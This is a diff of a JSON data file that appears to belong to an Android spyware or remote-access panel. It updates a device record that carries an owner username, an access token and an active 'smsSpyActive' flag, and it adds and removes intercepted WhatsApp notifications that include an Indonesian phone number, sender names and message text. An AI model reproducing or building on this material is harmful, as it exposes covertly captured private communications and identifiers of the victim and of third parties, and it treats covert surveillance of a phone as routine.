@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776033612867,
+    "lastSeen": 1776033622144,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -130,6 +130,22 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 831-8452-5417: +62 831-8452-5417",
+        "content": "Anda ditambahkan",
+        "time": "13/04 05:40",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776033622145
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 831-8452-5417",
+        "content": "Anda ditambahkan",
+        "time": "13/04 05:40",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776033622086
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4113,22 +4129,6 @@
         "time": "12/04 21:04",
         "pkg": "com.whatsapp",
         "receivedAt": 1776002708966
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.: ~ ᥎ᥱᥒᥱzz @sǔnnʏw͠avȇ",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "12/04 21:04",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776002692612
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "⚊` 𝑳𝑝𝒎 & 𝑳𝑎𝒑𝑎𝒌 𝑵𝑒𝒆𝒅 𝐴𝒍𝑙 𝑹𝒂𝑽𝒆𝒏𝑬𝒍 ⋆˚🕸️˚⋆. 𝑳𝑬𝑭𝑻? 𝑰𝒁𝑰𝑵.",
-        "content": "~ ᥎ᥱᥒᥱzz @sǔnnʏw͠avȇ: Menyebut grup Anda secara privat di status",
-        "time": "12/04 21:04",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776002692095
       }
     ],
     "galleryPhotos": [],
